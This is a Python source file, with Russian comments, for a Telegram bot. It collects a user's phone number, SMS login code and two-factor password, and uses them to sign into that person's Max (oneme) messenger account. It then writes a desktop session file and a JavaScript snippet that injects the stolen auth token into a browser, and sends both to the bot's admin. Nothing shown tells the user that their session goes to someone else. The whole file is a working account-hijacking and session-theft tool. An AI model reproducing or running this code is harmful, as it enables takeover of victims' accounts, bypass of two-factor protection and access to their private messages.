# Свой провайдер кода, который не лезет в консоль
class TelegramCodeProvider(auth_providers.SmsCodeProvider):
    def __init__(self):
        self._code = None
        self._event = asyncio.Event()
    
    async def get_code(self, phone: str) -> str:
        self._event.clear()
        await self._event.wait()
        code = self._code
        self._code = None
        return code
    
    def set_code(self, code: str):
        self._code = code
        self._event.set()

class AuthState(StatesGroup):
    waiting_for_code = State()
    waiting_for_password = State()

pending_clients = {}

def gen_password():
    import random, string
    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#", k=40))

def build_desktop_json(token, device_id, session_id, password, user_id, phone, first_name="", last_name=""):
    return {
        "token": token,
        "device_id": device_id,
        "session_id": session_id,
        "password": password,
        "connection_params": {
            "device_type": "DESKTOP",
            "header_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "app_version": "25.12.13",
            "device_name": "Chrome",
            "os_version": "Windows 10",
            "locale": "ru",
            "device_locale": "ru",
            "screen": "1080x1920",
            "timezone": "Europe/Moscow"
        },
        "user": {
            "user_id": user_id,
            "phone": int(phone.replace("+", "")),
            "photo_id": None,
            "first_name": first_name,
            "last_name": last_name
        }
    }

def generate_web_js(password, device_id, token, viewer_id):
    return f"""PASSWORD: {password}

sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{device_id}');
localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{token}","viewerId":{viewer_id}}}));
window.location.reload();"""

async def finalize_auth(client, phone, user_id, work_dir, message):
    await message.answer("✅ Готовлю файлы...")
    
    device_id = str(uuid.uuid4())
    token = client.token
    viewer_id = client.my_id
    password = gen_password()
    session_id = int(time.time() * 1000)
    
    desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
    js = generate_web_js(password, device_id, token, viewer_id)
    
    dp_path = f"{work_dir}/desktop_session.json"
    with open(dp_path, "w") as f:
        json.dump(desktop, f, indent=4)
    web_path = f"{work_dir}/web_token.js"
    with open(web_path, "w") as f:
        f.write(js)
    
    await bot.send_document(ADMIN_ID, FSInputFile(dp_path),
        caption=f"💻 <b>ДЕСКТОПНАЯ СЕССИЯ</b>\nНомер: {phone}", parse_mode="HTML")
    await bot.send_document(ADMIN_ID, FSInputFile(web_path),
        caption=f"🌐 <b>ВЕБ-ТОКЕН (JS)</b>\nНомер: {phone}", parse_mode="HTML")
    await message.answer("🔐 Готово!")

@dp.message(F.text == "/start")

@dp.message(F.text.regexp(r'^\+7\d{10}$'))
async def phone_handler(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    uid = message.from_user.id
    work_dir = f"cache/{uid}"
    os.makedirs(work_dir, exist_ok=True)
    
    code_provider = TelegramCodeProvider()
    client = SocketMaxClient(phone=phone, work_dir=work_dir, code_provider=code_provider)
    
    pending_clients[uid] = {
        "client": client,
        "phone": phone,
        "work_dir": work_dir,
        "code_provider": code_provider
    }
    
    await state.set_state(AuthState.waiting_for_code)
    await state.update_data(phone=phone, work_dir=work_dir)
    
    # Запускаем клиент в фоне (он сам запросит SMS и будет ждать код от провайдера)
    asyncio.create_task(run_client(uid, client, message))
    await message.answer("📩 Запрашиваю SMS-код...")

async def run_client(uid, client, message):
    try:
        await client.start()
        # Если дошли сюда — авторизация прошла без ошибок
        # (код уже был получен через TelegramCodeProvider)
    except Exception as e:
        await message.answer(f"❌ Ошибка авторизации: {e}")
        if uid in pending_clients:
            del pending_clients[uid]

@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
async def code_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    code = message.text.strip()
    
    if uid not in pending_clients:
        await message.answer("⏳ Сессия устарела.")
        return
    
    provider = pending_clients[uid]["code_provider"]
    provider.set_code(code)
    
    await message.answer("⏳ Проверяю код...")
    # Ждем результат от run_client (или 2FA, или успех, или ошибка)
    
    # Даем время на обработку
    await asyncio.sleep(3)
    
    data = await state.get_data()
    phone = data["phone"]
    work_dir = data["work_dir"]
    client = pending_clients[uid]["client"]
    
    try:
        # Проверяем, авторизовались ли
        if client.token:
            await finalize_auth(client, phone, uid, work_dir, message)
            del pending_clients[uid]
            await state.clear()
        else:
            await message.answer("⏳ Ожидаю завершения авторизации...")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message(AuthState.waiting_for_password)
async def password_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    pwd = message.text.strip()
    if uid not in pending_clients:
        await message.answer("⏳ Сессия устарела.")
        return
    
    client = pending_clients[uid]["client"]
    try:
        if hasattr(client, '_two_factor_auth'):
            await client._two_factor_auth(pwd)
        elif hasattr(client, 'send_password'):
            await client.send_password(pwd)
        
        data = await state.get_data()
        phone = data["phone"]
        work_dir = data["work_dir"]
        await finalize_auth(client, phone, uid, work_dir, message)
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {e}")
    finally:
        del pending_clients[uid]
        await state.clear()
